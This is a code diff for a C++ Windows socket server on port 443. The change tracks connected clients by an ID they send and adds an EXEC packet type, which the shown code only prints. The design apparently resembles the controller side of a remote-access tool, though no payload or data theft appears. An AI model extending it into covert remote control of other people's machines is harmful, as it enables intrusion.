@@ -16,9 +16,9 @@ using namespace std;
 #define PORT 443
 #define BUF_SIZE 512
 
-void clientThread(SOCKET conn);
+void clientThread(Client* client);
 
-map<string, Client> clients;
+map<string, Client*> clients;
 
 int main(int argc, char** argv) {
 	WSAData wsaData;
@@ -53,8 +53,15 @@ int main(int argc, char** argv) {
 			cout << "Error accepting socket" << endl;
 			continue;
 		}
-		
-		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)clientThread, (LPVOID)conn, NULL, NULL);
+
+		SocketData idPacket;				//
+		Client* newClient = new Client;		//
+		newClient->conn = conn;				//
+		_recv(newClient->conn, idPacket);	//	Save newClient to clients map
+		newClient->id = idPacket.data;		//
+		clients[newClient->id] = newClient;	//
+
+		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)clientThread, (LPVOID)newClient, NULL, NULL);
 	}
 
 	closesocket(sListen);
@@ -66,27 +73,25 @@ int main(int argc, char** argv) {
 	return 0;
 }
 
-void clientThread(SOCKET conn)
+void clientThread(Client* client)
 {
-	Client client;
-	client.conn = conn;
+	initCapture(client);
 
-	initCapture(&client);
-
-	cout << "Client connected!" << endl;
+	cout << "Client connected! [" << client->id << "]" << endl;
 
 	while (true) {
 		Sleep(50);
 
-		while (!client.packets.empty()) {
-			SocketData packet = client.packets.back();
-			client.packets.pop();
+		while (!(*client).packets.empty()) {
+			SocketData packet = (*client).packets.back();
+			(*client).packets.pop();
 
 			switch (packet.tag) {
-				case SocketTag::SET_ID: {
-					client.id = packet.data;
-					break;
-				}
+			case SocketTag::EXEC: {
+				cout << "EXEC [" << client->id << "]" << endl;
+				cout << packet.data << endl;
+				break;
+			}
 			}
 		}
 	}
